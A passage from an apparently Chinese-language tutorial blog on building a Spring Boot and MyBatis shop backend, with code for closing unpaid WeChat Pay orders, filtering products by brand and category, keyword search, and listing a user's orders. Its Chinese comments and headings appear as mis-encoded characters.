class="hljs-meta">@Scheduled(cron = &quot;0/60 * * * * ?&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">checkAndCloseOrder</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-comment">// é¦–å…ˆæŸ¥è¯¢å·²å¤±æ•ˆçš„æœªæ”¯ä»˜è®¢å•</span>    <span class="hljs-comment">// è®¢å•çš„æœ‰æ•ˆæ”¯ä»˜æ—¶é—´æ˜¯åŠå°æ—¶ï¼Œå› æ­¤åˆ¤æ–­è®¢å•æ˜¯å¦å¤±æ•ˆï¼Œå°±æ˜¯ä»å½“å‰æ—¶é—´ä¸‹ï¼Œå‘å‰æ¨åŠä¸ªå°æ—¶ï¼Œ</span>    <span class="hljs-comment">// å¦‚æœè®¢å•çš„åˆ›å»ºæ—¶é—´ä¸åœ¨æ­¤èŒƒå›´å†…åˆ™å±äºå¤±æ•ˆçš„è®¢å•</span>    <span class="hljs-comment">// éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æ•°æ®åº“æŸ¥è¯¢åˆ°æ˜¯ æœªæ”¯ä»˜ çŠ¶æ€çš„ä¸ä¸€å®šå°±ä¸€å®šæ˜¯æœªæ”¯ä»˜ï¼Œå› ä¸ºæ”¯ä»˜å¹³å°æ”¯ä»˜æˆåŠŸå¯¹æœåŠ¡å™¨å“åº”è¿‡ç¨‹ä¸­å¯èƒ½</span>    <span class="hljs-comment">// å‡ºç°æ„æƒ³ä¸åˆ°çš„é—®é¢˜ï¼Œæ‰€ä»¥åœ¨ä¿®æ”¹è®¢å•çŠ¶æ€ä¹‹å‰ä¸€å®šè¦å‘æ”¯ä»˜å¹³å°ç¡®è®¤æ­¤è®¢å•çš„çŠ¶æ€ï¼Œè‹¥ä»ç„¶æ˜¯ æœªæ”¯ä»˜ åˆ™å–æ¶ˆè®¢å•</span>    <span class="hljs-comment">// å–æ¶ˆè®¢å•åéœ€è¦ä¿®æ”¹è®¢å•çŠ¶æ€ ä¸ºæ”¯ä»˜å¤±è´¥(6)ï¼Œå¹¶å‘æ”¯ä»˜å¹³å°é€šçŸ¥å–æ¶ˆæ”¯ä»˜é“¾æ¥</span>    <span class="hljs-comment">// å–æ¶ˆè®¢å•åï¼Œéœ€è¦æ¢å¤å•†å“çš„åº“å­˜ï¼Œå°±æ˜¯ProductSkuä¸­çš„stock + OrderItem(è®¢å•å¿«ç…§)ä¸­çš„buy_conuts</span>    <span class="hljs-comment">// è¿™é‡Œéœ€è¦è€ƒè™‘åˆ°æ•°æ®åº“çš„å¹¶å‘é—®é¢˜ï¼Œéœ€è¦åŠ é”å’Œäº‹åŠ¡ç®¡ç†</span>        <span class="hljs-comment">// 1.æŸ¥è¯¢è¶…è¿‡ä¸‰ååˆ†é’Ÿæœªæ”¯ä»˜è®¢å•</span>    <span class="hljs-keyword">try</span>&#123;        System.out.println(<span class="hljs-string">&quot;1â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”----1&quot;</span>);        Example example = <span class="hljs-keyword">new</span> Example(Orders.class);        Example.Criteria criteria = example.createCriteria();        Date time = <span class="hljs-keyword">new</span> Date(System.currentTimeMillis() - <span class="hljs-number">30</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>);        criteria.andLessThan(<span class="hljs-string">&quot;createTime&quot;</span>, time);        List&lt;Orders&gt; orders = ordersMapper.selectByExample(example);        <span class="hljs-comment">//2.è®¿é—®å¾®ä¿¡å¹³å°æ¥å£ï¼Œç¡®è®¤å½“å‰è®¢å•æœ€ç»ˆçš„æ”¯ä»˜çŠ¶æ€</span>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; orders.size(); i++) &#123;            Orders order = orders.get(i);            HashMap&lt;String, String&gt; params = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();            params.put(<span class="hljs-string">&quot;out_trade_no&quot;</span>, order.getOrderId());            <span class="hljs-comment">// ä½¿ç”¨å¾®ä¿¡æ”¯ä»˜æä¾›å‘æ¥å£æŸ¥è¯¢è®¢å•çš„æ”¯ä»˜çŠ¶æ€</span>            Map&lt;String, String&gt; resp = wxPay.orderQuery(params);            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;SUCCESS&quot;</span>.equalsIgnoreCase(resp.get(<span class="hljs-string">&quot;trade_state&quot;</span>)))&#123;                <span class="hljs-comment">//2.1 å¦‚æœè®¢å•å·²ç»æ”¯ä»˜ï¼Œåˆ™ä¿®æ”¹è®¢å•çŠ¶æ€ä¸º&quot;ä»£å‘è´§/å·²æ”¯ä»˜&quot;  status = 2</span>                Orders updateOrder = <span class="hljs-keyword">new</span> Orders();                updateOrder.setOrderId(order.getOrderId());                updateOrder.setStatus(<span class="hljs-string">&quot;2&quot;</span>);                ordersMapper.updateByPrimaryKeySelective(updateOrder);            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;NOTPAY&quot;</span>.equalsIgnoreCase(resp.get(<span class="hljs-string">&quot;trade_state&quot;</span>)))&#123;                <span class="hljs-comment">//2.2 å¦‚æœç¡®å®æœªæ”¯ä»˜ åˆ™å–æ¶ˆè®¢å•ï¼š</span>                <span class="hljs-comment">//  a.å‘å¾®ä¿¡æ”¯ä»˜å¹³å°å‘é€è¯·æ±‚ï¼Œå…³é—­å½“å‰è®¢å•çš„æ”¯ä»˜é“¾æ¥</span>                Map&lt;String, String&gt; map = wxPay.closeOrder(params);                System.out.println(map);                <span class="hljs-comment">// b.å…³é—­è®¢å•</span>                orderService.closeOrder(order.getOrderId());            &#125;        &#125;    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;        e.printStackTrace();    &#125;&#125;</code></pre></li></ul><h3 id="1-12-æ ¹æ®å“ç‰Œç­›é€‰å•†å“"><a href="#1-12-æ ¹æ®å“ç‰Œç­›é€‰å•†å“" class="headerlink" title="1.12 æ ¹æ®å“ç‰Œç­›é€‰å•†å“"></a>1.12 æ ¹æ®å“ç‰Œç­›é€‰å•†å“</h3><h4 id="è·å–æŸä¸ªå•†å“çš„æ‰€æœ‰å“ç‰Œ"><a href="#è·å–æŸä¸ªå•†å“çš„æ‰€æœ‰å“ç‰Œ" class="headerlink" title="è·å–æŸä¸ªå•†å“çš„æ‰€æœ‰å“ç‰Œ"></a>è·å–æŸä¸ªå•†å“çš„æ‰€æœ‰å“ç‰Œ</h4><ul><li><p>sql</p><p>é¦–å…ˆæ ¹æ®åˆ†ç±»çš„category_idè·å–è¯¥åˆ†ç±»ä¸‹çš„æ‰€æœ‰å•†å“ï¼Œå†ä»è¿™äº›å•†å“ä¸­è·å–åˆ°å“ç‰Œåç§°</p><pre><code class="hljs mysql">select product_id from product  where category_id&#x3D; cid  select  select DISTINCT brand  from product_params  where product_id in cids&#x2F;&#x2F; åˆå¹¶select  select DISTINCT brand  from product_params  where product_id in (select product_id from product  where category_id&#x3D; cid  )</code></pre></li><li><p>dao</p><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * æ ¹æ®ç±»åˆ«idæŸ¥è¯¢æ­¤ç±»åˆ«ä¸‹çš„å•†å“çš„å“ç‰Œåˆ—è¡¨</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> cid</span><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><span class="hljs-comment"> */</span><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title">selectBrandByCategoryId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> cid)</span></span>;</code></pre><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectBrandByCategoryId&quot;</span> <span class="hljs-attr">resultSets</span>=<span class="hljs-string">&quot;java.util.List&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;String&quot;</span>&gt;</span>    select DISTINCT brand    from product_params    where product_id in (    select product_id    from product    where category_id=#&#123;cid&#125;    )<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listBrands</span><span class="hljs-params">(<span class="hljs-keyword">int</span> categoryId)</span> </span>&#123;    List&lt;String&gt; brands = productMapper.selectBrandByCategoryId(categoryId);    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK,<span class="hljs-string">&quot;success&quot;</span>,brands);&#125;</code></pre></li><li><p>controller</p><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/listbrands/&#123;cid&#125;&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getListBrands</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;cid&quot;)</span> String cid)</span></span>&#123;    <span class="hljs-keyword">return</span> productService.listBrands(Integer.parseInt(cid));&#125;</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716105333765.png" alt="image-20220716105333765"></p></li></ul><h4 id="æ ¹æ®åˆ†ç±»å’Œå“ç‰Œåˆ†é¡µæŸ¥è¯¢å•†å“"><a href="#æ ¹æ®åˆ†ç±»å’Œå“ç‰Œåˆ†é¡µæŸ¥è¯¢å•†å“" class="headerlink" title="æ ¹æ®åˆ†ç±»å’Œå“ç‰Œåˆ†é¡µæŸ¥è¯¢å•†å“"></a>æ ¹æ®åˆ†ç±»å’Œå“ç‰Œåˆ†é¡µæŸ¥è¯¢å•†å“</h4><table><thead><tr><th>è¯·æ±‚url</th><th>å“åº”ç»“æœ</th></tr></thead><tbody><tr><td>product/listbycid/49?pageNum=1&amp;limit=4</td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716105625379.png" alt="image-20220716105625379"></td></tr></tbody></table><ul><li><p>sql</p><p>ç”±å“åº”æ•°æ®å¯ä»¥çœ‹å‡ºæ˜¯åˆ†é¡µæŸ¥è¯¢ï¼Œå¹¶ä¸”å°†å•†å“çš„ä»·æ ¼æœ€ä½çš„skuä¸€èµ·è¿”å›</p><pre><code class="hljs mysql">select * from product_sku where prodoct_id &#x3D; 1 ORDER BY  sell_price limit 0,1select * from product where category_id &#x3D; 49</code></pre></li><li><p>dao</p><pre><code class="hljs java"> * æ ¹æ®ä¸‰çº§åˆ†ç±»IDåˆ†é¡µæŸ¥è¯¢å•†å“ä¿¡æ¯ * <span class="hljs-meta">@param</span> cid ä¸‰çº§åˆ†ç±»id * <span class="hljs-meta">@param</span> start èµ·å§‹ç´¢å¼• * <span class="hljs-meta">@param</span> limit æŸ¥è¯¢è®°å½•æ•° * <span class="hljs-meta">@return</span> */<span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;ProductVO&gt; <span class="hljs-title">selectProductByCategoryId</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;cid&quot;)</span> <span class="hljs-keyword">int</span> cid,</span></span><span class="hljs-function"><span class="hljs-params">                                                 <span class="hljs-meta">@Param(&quot;start&quot;)</span> <span class="hljs-keyword">int</span> start,</span></span><span class="hljs-function"><span class="hljs-params">                                                 <span class="hljs-meta">@Param(&quot;limit&quot;)</span> <span class="hljs-keyword">int</span> limit)</span></span>;</code></pre><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ProductVOMap2&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ProductVO&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;root_category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;rootCategoryId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sold_num&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;soldNum&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productStatus&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;update_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updateTime&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;LONGVARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;content&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!--  æ ¹æ®å•†å“IDæŸ¥è¯¢ä»·æ ¼æœ€ä½çš„å¥—é¤  --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skus&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.dao.ProductSkuMapper.selectLowerestPriceByProductId&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectProductByCategoryId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ProductVOMap2&quot;</span>&gt;</span>  select  product_id,          product_name,          category_id,          root_category_id,          sold_num,          product_status,          content,          create_time,          update_time  from product  where category_id=#&#123;cid&#125;  limit #&#123;start&#125;,#&#123;limit&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre><p>selectLowerestPriceByProductId</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ProductSku&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuName&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_img&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuImg&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;untitled&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;untitled&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;original_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;originalPrice&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sell_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sellPrice&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;discounts&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;discounts&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;stock&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;stock&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;update_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updateTime&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;status&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectLowerestPriceByProductId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>  select  sku_id,product_id,sku_name, sku_img,untitled,original_price,sell_price,    discounts,stock,create_time,update_time,status  from product_sku  where product_id = #&#123;productId&#125;  ORDER BY  sell_price limit 0,1<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductsByCategoryId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> categoryId, <span class="hljs-keyword">int</span> pageNum, <span class="hljs-keyword">int</span> limit)</span> </span>&#123;    <span class="hljs-comment">//1.æŸ¥è¯¢åˆ†é¡µæ•°æ®</span>    <span class="hljs-keyword">int</span> start = (pageNum-<span class="hljs-number">1</span>)*limit;    List&lt;ProductVO&gt; productVOS = productMapper.selectProductByCategoryId(categoryId, start, limit);    <span class="hljs-comment">//2.æŸ¥è¯¢å½“å‰ç±»åˆ«ä¸‹çš„å•†å“çš„æ€»è®°å½•æ•°</span>    Example example = <span class="hljs-keyword">new</span> Example(Product.class);    Example.Criteria criteria = example.createCriteria();    criteria.andEqualTo(<span class="hljs-string">&quot;categoryId&quot;</span>,categoryId);    <span class="hljs-keyword">int</span> count = productMapper.selectCountByExample(example);    <span class="hljs-comment">//3.è®¡ç®—æ€»é¡µæ•°</span>    <span class="hljs-keyword">int</span> pageCount = count%limit==<span class="hljs-number">0</span>? count/limit : count/limit+<span class="hljs-number">1</span>;    <span class="hljs-comment">//4.å°è£…è¿”å›æ•°æ®</span>    PageHelper&lt;ProductVO&gt; pageHelper = <span class="hljs-keyword">new</span> PageHelper&lt;&gt;(count, pageCount, productVOS);    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK,<span class="hljs-string">&quot;SUCCESS&quot;</span>,pageHelper);&#125;</code></pre></li><li><p>controller</p><pre><code class="hljs java"><span class="hljs-meta">@ApiOperation(&quot;å•†å“å“ç‰Œåˆ†é¡µæŸ¥è¯¢æ¥å£&quot;)</span><span class="hljs-meta">@GetMapping(&quot;/listbycid/&#123;cid&#125;&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductsByCategoryId</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;cid&quot;)</span> String cid,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-meta">@RequestParam(&quot;pageNum&quot;)</span> <span class="hljs-keyword">int</span> pageNum,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-meta">@RequestParam(&quot;limit&quot;)</span> <span class="hljs-keyword">int</span> limit)</span></span>&#123;    <span class="hljs-keyword">return</span> productService.getProductsByCategoryId(Integer.parseInt(cid), pageNum, limit);&#125;</code></pre></li></ul><p>  <img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716114341669.png" alt="image-20220716114341669"></p><h3 id="1-13-å…³é”®å­—æœç´¢å•†å“"><a href="#1-13-å…³é”®å­—æœç´¢å•†å“" class="headerlink" title="1.13 å…³é”®å­—æœç´¢å•†å“"></a>1.13 å…³é”®å­—æœç´¢å•†å“</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716114519584.png" alt="image-20220716114519584"></p><h4 id="æœç´¢ç›¸å…³å•†å“çš„å“ç‰Œ"><a href="#æœç´¢ç›¸å…³å•†å“çš„å“ç‰Œ" class="headerlink" title="æœç´¢ç›¸å…³å•†å“çš„å“ç‰Œ"></a>æœç´¢ç›¸å…³å•†å“çš„å“ç‰Œ</h4><ul><li><p>dao</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectBrandByKeyword&quot;</span> <span class="hljs-attr">resultSets</span>=<span class="hljs-string">&quot;java.util.List&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;String&quot;</span>&gt;</span>    select DISTINCT brand    from product_params    where product_id in (    select product_id    from product    where product_name like #&#123;kw&#125;    )<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listBrands</span><span class="hljs-params">(String kw)</span> </span>&#123;    kw = <span class="hljs-string">&quot;%&quot;</span>+kw+<span class="hljs-string">&quot;%&quot;</span>;    List&lt;String&gt; brands = productMapper.selectBrandByKeyword(kw);    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK,<span class="hljs-string">&quot;SUCCESS&quot;</span>,brands);&#125;</code></pre></li></ul><h4 id="æœç´¢å‡ºåŒ…å«å…³é”®è¯çš„å•†å“"><a href="#æœç´¢å‡ºåŒ…å«å…³é”®è¯çš„å•†å“" class="headerlink" title="æœç´¢å‡ºåŒ…å«å…³é”®è¯çš„å•†å“"></a>æœç´¢å‡ºåŒ…å«å…³é”®è¯çš„å•†å“</h4><ul><li><p>dao</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectProductByKeyword&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ProductVOMap2&quot;</span>&gt;</span>    select  product_id,    product_name,    category_id,    root_category_id,    sold_num,    product_status,    content,    create_time,    update_time    from product    where product_name like #&#123;kw&#125;    limit #&#123;start&#125;,#&#123;limit&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">searchProduct</span><span class="hljs-params">(String kw, <span class="hljs-keyword">int</span> pageNum, <span class="hljs-keyword">int</span> limit)</span> </span>&#123;    <span class="hljs-comment">//1.æŸ¥è¯¢æœç´¢ç»“æœ</span>    kw = <span class="hljs-string">&quot;%&quot;</span>+kw+<span class="hljs-string">&quot;%&quot;</span>;    <span class="hljs-keyword">int</span> start = (pageNum-<span class="hljs-number">1</span>)*limit;    List&lt;ProductVO&gt; productVOS = productMapper.selectProductByKeyword(kw, start, limit);    <span class="hljs-comment">//2.æŸ¥è¯¢æ€»è®°å½•æ•°</span>    Example example = <span class="hljs-keyword">new</span> Example(Product.class);    Example.Criteria criteria = example.createCriteria();    criteria.andLike(<span class="hljs-string">&quot;productName&quot;</span>,kw);    <span class="hljs-keyword">int</span> count = productMapper.selectCountByExample(example);    <span class="hljs-comment">//3.è®¡ç®—æ€»é¡µæ•°</span>    <span class="hljs-keyword">int</span> pageCount = count%limit==<span class="hljs-number">0</span>? count/limit:count/limit+<span class="hljs-number">1</span>;    <span class="hljs-comment">//4.å°è£…ï¼Œè¿”å›æ•°æ®</span>    PageHelper&lt;ProductVO&gt; pageHelper = <span class="hljs-keyword">new</span> PageHelper&lt;&gt;(count, pageCount, productVOS);    ResultVO resultVO = <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;SUCCESS&quot;</span>, pageHelper);    <span class="hljs-keyword">return</span> resultVO;&#125;</code></pre></li></ul><h3 id="1-14-ä¸ªäººä¸­å¿ƒ"><a href="#1-14-ä¸ªäººä¸­å¿ƒ" class="headerlink" title="1.14 ä¸ªäººä¸­å¿ƒ"></a>1.14 ä¸ªäººä¸­å¿ƒ</h3><h4 id="æ˜¾ç¤ºæ‰€æœ‰è®¢å•"><a href="#æ˜¾ç¤ºæ‰€æœ‰è®¢å•" class="headerlink" title="æ˜¾ç¤ºæ‰€æœ‰è®¢å•"></a>æ˜¾ç¤ºæ‰€æœ‰è®¢å•</h4><blockquote><p>order/list?userId=15&amp;pageNum=1&amp;limit=5&amp;status=1</p></blockquote><ul><li><p>dao</p><p>OrdersMapper</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;OrdersVO&gt; <span class="hljs-title">selectOrders</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;userId&quot;)</span> String userId,</span></span><span class="hljs-function"><span class="hljs-params">                                   <span class="hljs-meta">@Param(&quot;status&quot;)</span> String status,</span></span><span class="hljs-function"><span class="hljs-params">                                   <span class="hljs-meta">@Param(&quot;start&quot;)</span> <span class="hljs-keyword">int</span> start,</span></span><span class="hljs-function"><span class="hljs-params">                                   <span class="hljs-meta">@Param(&quot;limit&quot;)</span> <span class="hljs-keyword">int</span> limit)</span></span>;</code></pre><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;OrdersVOMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.OrdersVO&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderId&quot;</span> /&gt;</span>    <span 